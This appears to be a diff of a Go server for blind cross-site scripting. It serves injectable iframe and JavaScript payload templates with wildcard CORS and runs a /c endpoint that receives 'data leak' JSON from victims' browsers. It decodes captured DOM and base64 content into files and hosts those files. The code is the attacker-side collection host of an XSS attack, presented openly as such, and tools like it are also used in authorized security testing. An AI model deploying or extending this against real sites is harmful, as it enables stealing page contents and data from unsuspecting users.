@@ -1,15 +1,5 @@
 package main
 
-// TODO:
-// - Refactor code
-// - Add https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin header where necessary
-// - Add js file routes
-// - Improve output format
-// - Rename iframe and iframe-ext
-
-// https://raw.githubusercontent.com/mazen160/xless/master/payload.js
-// https://github.com/mazen160/xless
-
 import (
     "fmt"
     "net/http"
@@ -31,7 +21,6 @@ const (
     OUTPUT_FOLDER = "output"
 )
 
-
 type logWriter struct {}
 
 func (writer logWriter) Write(bytes []byte) (int, error) {
@@ -49,15 +38,21 @@ func (writer logWriter) Write(bytes []byte) (int, error) {
 }
 
 func PrintRequest(r *http.Request, reason string) {
-    log.Println("::::::::::::::::::::::::::::::::::::")
-    log.Println(strings.ToUpper(reason), "|", r.RemoteAddr)
-    log.Println("::::::::::::::::::::::::::::::::::::")
+    var out strings.Builder
+    defer func () {
+        log.Print(out.String())
+    }()
+
+    out.WriteString("::::::::::::::::::::::::::::::::::::\n")
+    out.WriteString(strings.ToUpper(reason) + " | " + r.RemoteAddr + "\n")
+    out.WriteString("::::::::::::::::::::::::::::::::::::\n")
+
     requestDump, err := httputil.DumpRequest(r, true)
     if err != nil {
-        log.Println(err)
+        out.WriteString(err.Error())
+        return
     }
-    lines := strings.Join(strings.Split(string(requestDump),"\n"),"\n\t")
-    log.Println(lines)
+    out.WriteString(strings.Join(strings.Split(string(requestDump),"\n"),"\n\t")+"\n")
 }
 
 func getSha1HashFromString(s string) string {
@@ -65,6 +60,13 @@ func getSha1HashFromString(s string) string {
     h.Write([]byte(s))
     sha1_hash := hex.EncodeToString(h.Sum(nil))
     return sha1_hash
+}
+
+func corsHeader(f http.HandlerFunc) http.HandlerFunc {
+    return func(w http.ResponseWriter, r *http.Request) {
+        w.Header().Set("Access-Control-Allow-Origin", "*")
+        f(w,r)
+    }
 }
 
 type Data struct {
@@ -76,34 +78,55 @@ func main() {
     port := 8899
     scheme := "http"
 
-    tmpl := template.Must(template.ParseFiles("payload.html"))
-    tmplExt := template.Must(template.ParseFiles("ext-payload.html"))
+    tmpl := template.Must(template.ParseFiles("payloads/iframe.html"))
+    tmplExt := template.Must(template.ParseFiles("payloads/iframe-ext.html"))
+
+    tmpljs := template.Must(template.ParseFiles("payloads/payload.js"))
+    tmpljsExt := template.Must(template.ParseFiles("payloads/payload-ext.js"))
 
     // setting up logger
     log.SetFlags(0)
     log.SetOutput(new(logWriter))
 
-    http.HandleFunc("/payload", func(w http.ResponseWriter, r *http.Request) {
+    http.HandleFunc("/iframe.html", corsHeader(func(w http.ResponseWriter, r *http.Request) {
         PrintRequest(r, "Payload request")
         data := Data{
             Url: fmt.Sprintf("%s://%s/c", scheme, r.Host),
         }
         tmpl.Execute(w, data)
-    })
+    }))
 
-    http.HandleFunc("/extpayload", func(w http.ResponseWriter, r *http.Request) {
+    http.HandleFunc("/iframe-ext.html", corsHeader(func(w http.ResponseWriter, r *http.Request) {
         PrintRequest(r, "Payload request")
         data := Data{
             Url: fmt.Sprintf("%s://%s/c", scheme, r.Host),
         }
         tmplExt.Execute(w, data)
-    })
+    }))
+
+    http.HandleFunc("/payload.js", corsHeader(func(w http.ResponseWriter, r *http.Request) {
+        PrintRequest(r, "Payload request")
+        data := Data{
+            Url: fmt.Sprintf("%s://%s/c", scheme, r.Host),
+        }
+        tmpljs.Execute(w, data)
+    }))
+
+    http.HandleFunc("/payload-ext.js", corsHeader(func(w http.ResponseWriter, r *http.Request) {
+        PrintRequest(r, "Payload request")
+        data := Data{
+            Url: fmt.Sprintf("%s://%s/c", scheme, r.Host),
+        }
+        tmpljsExt.Execute(w, data)
+    }))
 
     // capture the data
-    http.HandleFunc("/c", func(w http.ResponseWriter, r *http.Request) {
-        log.Println("::::::::::::::::::::::::::::::::::::")
-        log.Println("Data leak received |", r.RemoteAddr)
-        log.Println("::::::::::::::::::::::::::::::::::::")
+    http.HandleFunc("/c", corsHeader(func(w http.ResponseWriter, r *http.Request) {
+        var out strings.Builder
+        out.WriteString("::::::::::::::::::::::::::::::::::::\n")
+        out.WriteString("Data leak received | " + r.RemoteAddr + "\n")
+        out.WriteString("::::::::::::::::::::::::::::::::::::\n")
+
         var extracted map[string] string
         //PrintRequest(r, "asdf")
         if err := json.NewDecoder(r.Body).Decode(&extracted); err == nil {
@@ -114,7 +137,7 @@ func main() {
                     url := fmt.Sprintf("%s://%s/%s", scheme, r.Host, filename)
                     // write dom to file
                     ioutil.WriteFile(filename,[]byte(v), os.FileMode(0666))
-                    log.Printf("%15s | %s\n", k, url)
+                    out.WriteString(fmt.Sprintf("%15s | %s\n", k, url))
                     continue
                 }
 
@@ -131,29 +154,28 @@ func main() {
                         continue
                     }
                     ioutil.WriteFile(filename,decodedString, os.FileMode(0666))
-                    log.Printf("%15s | %s\n", k, url)
+                    out.WriteString(fmt.Sprintf("%15s | %s\n", k, url))
                     continue
                 }
-                log.Printf("%15s | %s\n", k, v)
+                out.WriteString(fmt.Sprintf("%15s | %s\n", k, v))
             }
+            log.Print(out.String())
         } else {
             log.Println("[!] Something went wrong with this request [!]")
-            PrintRequest(r, "Some go run bruva during capture request!")
+            PrintRequest(r, "Somethin go rong bruva during capture request!")
         }
-    })
+    }))
 
     fs := http.FileServer(http.Dir(OUTPUT_FOLDER+"/"))
     http.Handle("/"+OUTPUT_FOLDER+"/", http.StripPrefix("/"+OUTPUT_FOLDER+"/", fs))
 
-    http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+    http.HandleFunc("/", corsHeader(func(w http.ResponseWriter, r *http.Request) {
         PrintRequest(r, "Casual request")
         fmt.Fprintln(w, "Hi Toby, I didn't expect you here so quickly.")
-    })
-
+    }))
 
     log.Printf("Starting server on port %d\n", port)
     if err := http.ListenAndServe(fmt.Sprintf(":%d",port), nil); err != nil {
         log.Fatalln("Server couldn't start:", err.Error())
     }
-
 }
